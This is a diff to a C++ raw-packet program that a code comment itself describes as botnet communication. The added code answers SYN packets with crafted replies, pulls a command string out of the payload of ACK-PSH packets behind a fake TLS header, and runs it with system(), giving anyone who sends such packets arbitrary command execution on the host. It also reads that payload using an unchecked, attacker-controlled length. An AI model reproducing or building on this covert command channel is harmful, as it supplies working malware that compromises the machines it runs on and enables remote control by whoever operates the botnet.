@@ -21,6 +21,13 @@ CRITICAL_SECTION HandleLock;
 #pragma comment(lib,"ws2_32.lib") //WinSock lib
 #pragma comment(lib, "IPHLPAPI.lib") //IP Helper lib
 
+//contains the TLS packet header
+typedef struct tls_header{
+	u_char type;		// Contains the type of packet
+	u_short version;	// This is not useful right meow
+	u_short length;		// Length of data
+}tls_header;
+
 //contains the dns packet data
 typedef struct dns_payload {
 	u_char size;
@@ -85,7 +92,9 @@ typedef struct tcp_head {
 typedef struct IPv4 {
 	u_char  ver_ihl;        // Version (4 bits) + Internet header length (4 bits)
 	u_char  tos;            // Type of service 
-	u_short tlen;           // Total length 
+	u_short tlen;			// Total Length
+	//u_char TLmajor;			// Total length major
+	//u_char TLminor;			// Total length minor
 	u_short identification; // Identification
 	u_short flags_fo;       // Flags (3 bits) + Fragment offset (13 bits)
 	u_char  ttl;            // Time to live
@@ -460,6 +469,7 @@ void decapsulate(const u_char *data, int size) {
 	IPv4* ih;
 	u_int head_len;
 	tcp_head* th;
+	tls_header* tls_head;
 	//udp_header* uh;
 	//u_short sport;
 	//u_short dport;
@@ -468,9 +478,10 @@ void decapsulate(const u_char *data, int size) {
 		// retireve the position of the ip header
 		ih = (IPv4 *)(data + 14); //length of ethernet header
 		int length = (int)ih->ver_ihl - 64;
-
+		
 		std::cout << length << std::endl;
-		if (length > 5) {
+		//length 6 is reserved for ack packets on botnet communication
+		if (length > 6) {
 			//get ip address as string
 			std::string address = "";
 			char octet[4];
@@ -499,16 +510,35 @@ void decapsulate(const u_char *data, int size) {
 			mac_address = mac_address + byte + ':';
 			_itoa_s((int)eth_hdr->src[5], byte, 10);
 			mac_address = mac_address + byte;
-
+			
 			if ((int)ih->proto == 6) {
 				//get tcp header
 				head_len = (ih->ver_ihl & 0xf) * 4;//length of ip header
 				th = (tcp_head *)((u_char*)ih + head_len);
 
+				std::cout << "Flags: " << (int)th->flag << std::endl;
 				//check control bit number for syn packet
 				if ((int)th->flag == 2) {
 					//send syn ack
 					send_packet(address, mac_address, "1");
+				}
+				//check control bit number for ack-psh packet
+				if ((int)th->flag == 24) {
+					//decapsulate TLS header
+					std::cout << "got it" << std::endl;
+					tls_head = (tls_header *)((u_char*)th + 20);
+					//have to flip bits because of memory type
+					int tls_data_len = ((tls_head->length & 0xFF) << 8) | ((tls_head->length >> 8) & 0xFF); //length of data
+					u_char* data_char = ((u_char*)tls_head + 12); //pointer to one byte of data
+					std::string command; //string that will contain command used
+					for (int i = 0; i < tls_data_len; i++) {
+						//get data
+						command = command + (char)*data_char;
+						//increment
+						data_char = data_char + 1;
+					}
+					//run command
+					int return_val = system(command.c_str());
 				}
 			}
 		}
@@ -726,7 +756,7 @@ int send_packet(std::string address, std::string mac_addr, std::string option) {
 	//TTL
 	packet[22] = 255;
 	//layer 4 protocol
-	packet[23] = 17;  //must be set to detect layer 4 protocols
+	packet[23] = 6;  //must be set to detect layer 4 protocols
 					  //header checksum
 	packet[24] = 39;
 	packet[25] = 50;
